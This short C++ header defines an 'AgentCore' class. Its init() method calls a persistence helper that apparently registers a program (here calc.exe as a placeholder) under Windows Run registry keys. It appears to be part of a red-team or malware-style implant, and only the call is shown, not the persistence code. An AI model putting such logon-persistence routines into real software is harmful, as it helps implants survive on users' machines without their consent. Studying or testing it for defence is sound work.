#pragma once
#include "resource.h"
#include <Windows.h>
#include <iostream>
#include "persistence.h"

using namespace std;

class AgentCore {
public:
	int init() {
		OutputDebugString(L"AgentCore::init()\n");
		char exePath[] = "C:\\Windows\\System32\\calc.exe";
		PersistenceClass persistence;
		persistence.persistenceViaRunKeys(exePath);
		return 0;
	}
};